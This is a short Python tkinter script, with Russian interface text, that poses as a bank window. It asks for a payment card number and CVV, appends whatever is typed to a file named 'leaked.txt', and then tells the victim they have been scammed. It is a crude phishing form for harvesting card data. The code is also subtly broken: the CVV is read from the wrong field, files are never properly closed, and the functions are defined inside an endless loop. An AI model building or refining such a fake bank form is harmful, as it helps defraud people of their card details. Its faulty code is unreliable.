from tkinter import *
on1=0
on2=0
f=open('leaked.txt','w')
f.close
while True:
    def creditnumer():
        global on1
        on1=1
        creditnum=ent.get()
        lbl.configure(text='Закройте окно для продолжения')
        f=open('leaked.txt','a')
        f.write(creditnum+'\n')
        f.close
    def cvv():
        global on2
        cvvv=ent.get()
        on2=1
        lbl.configure(text='Закройте окно для продолжения')
        f=open('leaked.txt','a')
        f.write(cvvv+'\n')
        f.close
    window=Tk()
    window.title('Банк')
    lbl=Label(text='Ведите номер карты и 3 цифры на обороте.')
    lbl.pack()
    ent=Entry(window,width=11)
    ent.focus()
    ent.pack()
    ent1=Entry(window,width=3)
    ent1.pack()
    btn=Button(window,text='Я ввёл номер',command=creditnumer)
    btn.pack()
    btn1=Button(window,text='Я ввёл CVV',command=cvv)
    btn1.pack()
    while on1==1 and on2==1:
        lbl.configure(text='тебя заскамили')
        break
        exit
    window.mainloop()

